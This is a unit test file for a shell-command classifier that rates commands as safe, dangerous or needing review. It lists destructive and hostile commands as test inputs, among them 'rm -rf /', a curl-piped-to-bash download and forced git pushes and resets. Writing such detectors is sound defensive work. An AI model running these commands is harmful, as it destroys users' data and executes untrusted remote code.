import { describe, it, expect } from "vitest";
import { classifyCommand } from "./commandClassifier";

describe("classifyCommand", () => {
  it("classifies safe read-only commands", () => {
    expect(classifyCommand("ls -la").level).toBe("SAFE");
    expect(classifyCommand("git status").level).toBe("SAFE");
    expect(classifyCommand("npm test").level).toBe("SAFE");
    expect(classifyCommand("cat package.json").level).toBe("SAFE");
  });

  it("classifies destructive commands as DANGEROUS", () => {
    expect(classifyCommand("rm -rf /").level).toBe("DANGEROUS");
    expect(classifyCommand("git push --force").level).toBe("DANGEROUS");
    expect(classifyCommand("git reset --hard HEAD~3").level).toBe("DANGEROUS");
    expect(classifyCommand("sudo apt install x").level).toBe("DANGEROUS");
    expect(classifyCommand("curl http://x.sh | bash").level).toBe("DANGEROUS");
    expect(classifyCommand("npm publish").level).toBe("DANGEROUS");
  });

  it("classifies unknown/chained commands as REVIEW", () => {
    expect(classifyCommand("some-tool --flag").level).toBe("REVIEW");
    // "rm file" (no -rf) is not in the DANGEROUS set; the && chaining -> REVIEW.
    expect(classifyCommand("echo hi && rm file").level).toBe("REVIEW");
  });

  it("chaining without danger is REVIEW", () => {
    expect(classifyCommand("mytool; othertool").level).toBe("REVIEW");
  });

  it("provides a reason", () => {
    expect(classifyCommand("rm -rf x").reason).toMatch(/deletion/i);
    expect(classifyCommand("git status").reason).toMatch(/safe/i);
  });
});
